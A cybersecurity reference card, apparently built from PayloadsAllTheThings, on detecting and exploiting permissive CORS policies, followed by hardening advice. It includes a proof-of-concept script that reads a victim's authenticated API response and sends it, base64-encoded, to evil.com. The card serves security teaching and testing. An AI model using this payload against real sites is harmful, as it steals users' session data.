---
name: cors-misconfiguration
description: Identify and exploit permissive CORS policies that reflect Origin, trust null, allow wildcards with credentials, or trust subdomains and pre-domain prefixes
domain: cybersecurity
subdomain: web-application-security
tags: [cors, origin, sop-bypass, credentialed-request]
version: "1.0"
license: MIT
source: PayloadsAllTheThings/CORS Misconfiguration
---

# CORS Misconfiguration

## Overview
Cross-Origin Resource Sharing relaxes the Same-Origin Policy via `Access-Control-Allow-Origin` (ACAO). When servers reflect arbitrary origins or trust insecure ones, an attacker's page can read authenticated responses from the victim's session.

## When to Use
Any browser-reachable API that returns sensitive data with cookies/Authorization, and sets ACAO based on the request `Origin` header.

## Detection
Send `Origin: https://evil.com` and inspect response:
- `Access-Control-Allow-Origin: https://evil.com` + `Access-Control-Allow-Credentials: true` → critical.
- `Access-Control-Allow-Origin: null` (set on file://, sandboxed iframes) → exploit via `<iframe sandbox="allow-scripts" srcdoc=...>`.
- Wildcard `*` + credentials → browser refuses, but `*` alone may still leak public-but-not-listed data.

## Bypass / Trust Tricks
- **Pre/suffix concat bugs**: server allows `*.target.com` via naive regex — `eviltarget.com`, `target.com.evil.com` may pass.
- **Subdomain takeover** of a trusted subdomain → CORS trust inherited.
- **XSS on any whitelisted subdomain** → use it to read cross-origin data via fetch.
- **`null` origin** from sandbox iframes, data:, file:.
- **HTTP vs HTTPS** trust mismatch.
- **Trailing dot / case / unicode** in Origin: `Origin: https://target.com.` or punycode lookalikes.

## Exploit PoC
```html
<script>
fetch('https://api.target.com/me', {credentials:'include'})
  .then(r => r.text()).then(t => fetch('https://evil.com/x?d=' + btoa(t)));
</script>
```

## Hardening
- Strict allowlist; do not reflect `Origin`.
- Never combine `ACAO: *` with credentialed responses.
- Treat `null` as untrusted.
- Validate full origin, anchored regex (`^https://app\.target\.com$`).

## References
- `payloadsallthethings/CORS Misconfiguration/README.md`
- PortSwigger CORS labs.
